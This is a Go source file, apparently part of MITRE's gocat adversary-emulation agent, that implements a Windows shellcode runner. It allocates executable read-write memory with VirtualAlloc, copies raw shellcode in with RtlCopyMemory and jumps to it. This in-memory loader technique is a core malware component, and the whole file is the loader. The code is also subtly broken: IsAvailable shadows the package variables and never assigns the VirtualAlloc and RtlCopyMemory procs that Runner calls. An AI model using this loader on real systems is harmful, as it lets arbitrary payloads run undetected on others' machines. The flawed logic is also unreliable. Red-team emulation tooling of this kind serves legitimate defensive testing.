// +build windows

package shellcode

import (
	"fmt"
	"syscall"
	"unsafe"

	"github.com/mitre/gocat/execute"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      *syscall.DLL
	ntdll         *syscall.DLL
	VirtualAlloc  *syscall.Proc
	RtlCopyMemory *syscall.Proc
)

// Runner runner
func Runner(shellcode []byte) (bool, string) {
	address, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if checkErrorMessage(err) {
		return false, execute.ERROR_PID
	}
	_, _, err = RtlCopyMemory.Call(address, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if checkErrorMessage(err) {
		return false, execute.ERROR_PID
	}
	syscall.Syscall(address, 0, 0, 0, 0)
	return true, execute.SUCCESS_PID
}

// IsAvailable does a shellcode runner exist
func IsAvailable() bool {
	if kernel32, kernel32Err := syscall.LoadDLL("kernel32.dll"); kernel32Err == nil {
		if _, vAllocErr := kernel32.FindProc("VirtualAlloc"); vAllocErr != nil {
			fmt.Printf("[-] VirtualAlloc error: %s", vAllocErr.Error())
			return false
		}
		if ntdll, ntdllErr := syscall.LoadDLL("ntdll.dll"); ntdllErr == nil {
			if _, rtlCopyMemErr := ntdll.FindProc("RtlCopyMemory"); rtlCopyMemErr == nil {
				return true
			} else {
				fmt.Printf("[-] RtlCopyMemory error: %s", rtlCopyMemErr.Error())
			}
		}
	} else {
		fmt.Printf("[-] LoadDLL error: %s", kernel32Err.Error())
	}
	return false
}

// Check for error message
func checkErrorMessage(err error) bool {
	if err != nil && err.Error() != "The operation completed successfully." {
		println(err.Error())
		return true
	}
	return false
}